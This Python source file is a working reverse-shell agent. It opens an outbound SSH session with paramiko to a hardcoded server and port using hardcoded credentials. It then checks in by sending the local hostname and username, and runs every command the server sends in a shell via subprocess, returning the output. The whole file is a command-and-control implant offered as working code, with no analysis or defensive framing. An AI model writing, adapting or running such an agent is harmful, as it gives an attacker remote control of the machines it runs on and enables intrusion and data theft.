import paramiko
import subprocess
import sys
import os
import shlex
import socket
import getpass

def SSH_comm():
    #ip = str(sys.argv[1:])
    ip = '192.168.8.101' #Server IP
    port = 2222
    username = 'sshuser' #Server username
    password = 'sshpass' #Server password
    #print(ip)
    try:
        SSH = paramiko.SSHClient()
        SSH.set_missing_host_key_policy(paramiko.AutoAddPolicy())
        SSH.connect(ip, port=port, username=username, password=password)
        start_session = SSH.get_transport().open_session()
        host = socket.gethostname()
        user = getpass.getuser()
    except Exception as ex:
        print('Error, possible invalid sever IP.\nEx: agent.py 127.0.0.1\nDebug info: ' + str(ex))
        sys.exit()
        

    if start_session.active:
        start_session.send(f'Agent checked in from \'{host}\' as \'{user}\'.\n')
        print(start_session.recv(1024).decode())
        while True:
            incoming = start_session.recv(1024)
            try:
                command = incoming.decode()
                if command == 'exit':
                    sys.exit()
                if command.split(" ")[0] == 'cd':
                    path = command.split(" ")[1]
                    os.chdir(path)
                    CWD = os.getcwd()
                    #command_out = subprocess.check_output(shlex.split(command), stderr=subprocess.STDOUT, shell=True)
                    start_session.send(f'Changed directory to {CWD}\n')
                else:
                    command_out = subprocess.check_output(command, stderr=subprocess.STDOUT, shell=True)
                    #print(command)
                    start_session.send(command_out)
            except Exception as ex:
                start_session.send(str(ex) + '\n')
                sys.exit()
            except KeyboardInterrupt:
                start_session.send("Session interrupted.\n")
                sys.exit()
    return

if __name__ == "__main__":
    SSH_comm()
